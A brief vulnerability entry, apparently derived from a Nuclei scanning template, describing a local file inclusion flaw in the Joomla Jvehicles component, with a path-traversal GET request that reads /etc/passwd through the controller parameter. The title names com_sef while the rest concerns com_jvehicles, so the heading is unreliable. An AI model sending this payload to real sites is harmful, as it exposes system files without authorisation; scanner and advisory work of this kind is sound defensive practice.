# Vulnerability: Joomla! Component com_sef - Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`joomla-jvehicles-lfi.yaml`)

## Description
A local file inclusion vulnerability in the Jvehicles (com_jvehicles) component version 1.0 for Joomla! allows remote attackers to load arbitrary files via the controller parameter in index.php.

## Secure Mitigation
Upgrade to the latest version to mitigate this vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_jvehicles&controller=../../../../../../../../../../etc/passwd%00
```

